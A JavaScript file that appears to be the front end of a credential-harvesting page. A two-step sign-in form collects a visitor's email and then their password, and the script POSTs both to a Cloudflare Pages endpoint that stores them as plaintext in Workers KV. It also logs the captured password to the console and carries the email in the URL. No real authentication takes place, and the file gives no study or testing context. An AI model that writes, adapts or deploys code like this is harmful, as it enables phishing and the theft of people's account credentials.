// script.js (Client-side Fetch)

// Replace with your actual Pages URL
const PAGES_URL = "https://your-project-name.pages.dev";

async function storeCredential(key, value) {
    try {
        const response = await fetch(`${PAGES_URL}/api/store`, { // Send request to Worker
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ key: key, value: value })
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error("Error storing credential:", response.status, errorData);
            alert(`Error storing credential: ${response.status} - ${errorData.errors[0].message}`);
        } else {
            console.log('Credential stored successfully!');
        }
    } catch (error) {
        console.error("Error storing credential:", error);
        alert("An error occurred while storing the credential.");
    }
}

// Code for index.html (Handles form submission)
const form = document.getElementById('signin-form');
if (form) {
    form.addEventListener('submit', async function (event) {
        event.preventDefault();
        const emailInput = document.getElementById('email');
        const email = emailInput.value;

        // Store email in Cloudflare Workers KV (key only)
        await storeCredential(email, "");

        window.location.href = `welcome.html?email=${email}`;

    });
}

// Code for welcome.html (Handles email display and show password)
const urlParams = new URLSearchParams(window.location.search);
const userEmail = urlParams.get('email');
const userEmailElement = document.getElementById('user-email');
if (userEmailElement) {
    userEmailElement.textContent = userEmail;
}

const passwordForm = document.getElementById('password-form');
if (passwordForm) {
    passwordForm.addEventListener('submit', async function (event) {
        event.preventDefault();
        const passwordInput = document.getElementById('password');
        const password = passwordInput.value;

        // Store password in Cloudflare Workers KV (using email as key)
        await storeCredential(userEmail, password);

        // Redirect or display a success message
        console.log('Password stored in KV:', password);
    });
}

// Show Password functionality
const passwordInput = document.getElementById('password');
const showPasswordCheckbox = document.getElementById('show-password');
if (passwordInput && showPasswordCheckbox) {
    showPasswordCheckbox.addEventListener('change', function () {
        passwordInput.type = this.checked ? 'text' : 'password';
    });
}